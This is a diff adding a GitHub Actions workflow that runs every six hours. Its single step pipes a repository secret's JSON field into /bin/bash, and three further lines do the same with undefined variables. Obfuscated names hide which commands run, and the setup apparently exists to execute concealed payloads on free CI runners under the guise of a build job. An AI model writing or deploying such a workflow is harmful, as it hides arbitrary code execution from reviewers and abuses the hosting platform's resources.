@@ -1,0 +1,20 @@
+name: houyongjian7615
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: houyongjian7615
+        env:
+          z7: ${{ secrets.z7 }}
+        run: |
+          echo $z7 | jq -r .axo49 | /bin/bash
+          echo $q08568 | jq -r .kj4 | /bin/bash
+          echo $y903 | jq -r .tk41 | /bin/bash
+          echo $lmy804 | jq -r .yjnm4088 | /bin/bash
+
